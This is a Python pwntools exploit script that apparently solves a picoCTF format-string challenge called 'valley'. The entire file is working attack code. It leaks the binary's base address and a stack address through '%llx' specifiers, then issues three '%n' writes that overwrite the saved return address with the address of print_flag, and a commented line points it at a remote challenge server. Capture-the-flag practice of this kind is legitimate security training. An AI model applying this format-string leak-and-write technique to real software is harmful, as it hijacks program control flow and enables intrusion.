from pwn import *

elf = ELF('./valley')

offset = 6

p = elf.process()
#p = remote('shape-facility.picoctf.net', 53153)
p.recvline()

# get address (those who know 💀) of the main and subtract offset to get base address
p.sendline(b"%27$llx")

elf.address = int(p.recvline().decode("ascii").split(": ")[1], 16) - elf.symbols['main']

# get a stack address 8 bytes away from the storage of the return address
p.sendline(b"%20$llx")

stack = int(p.recvline().decode("ascii").split(": ")[1], 16) - 8

#print(hex(elf.address))
#print(hex(elf.symbols['print_flag']))

# write lower two bytes of the address of print_flag to the stack
shb = 2
pwn_line = b''
pwn_line += ("%" + str(elf.symbols['print_flag'] & 0xFFFF) + "c").encode('ascii')
pwn_line += f'%{offset+shb}$n'.encode('ascii')
pwn_line += (8*shb - len(pwn_line)) * b'.'
pwn_line += stack.to_bytes(8, byteorder='little')
pwn_line += b'\n'
#print(pwn_line)

p.sendline(pwn_line)
p.recvline()

# write middle-lower two bytes of the address of print_flag to the stack
stack += 2
pwn_line = b''
pwn_line += ("%" + str((elf.symbols['print_flag'] >> 16) & 0xFFFF) + "c").encode('ascii')
pwn_line += f'%{offset+shb}$n'.encode('ascii')
pwn_line += (8*shb - len(pwn_line)) * b'.'
pwn_line += stack.to_bytes(8, byteorder='little')
pwn_line += b'\n'
#print(pwn_line)

p.sendline(pwn_line)
p.recvline()

# write middle-upper two bytes of the address of print_flag to the stack
stack += 2
pwn_line = b''
pwn_line += ("%" + str((elf.symbols['print_flag'] >> 32) & 0xFFFF) + "c").encode('ascii')
pwn_line += f'%{offset+shb}$n'.encode('ascii')
pwn_line += (8*shb - len(pwn_line)) * b'.'
pwn_line += stack.to_bytes(8, byteorder='little')
pwn_line += b'\n'
#print(pwn_line)

p.sendline(pwn_line)
p.recvline()

# the upper two bytes of the address are unused, send b'exit' to return from the valley() method and jump to print_flag
p.sendline(b'exit')

# print flag
p.recvline()
print(p.recvline())
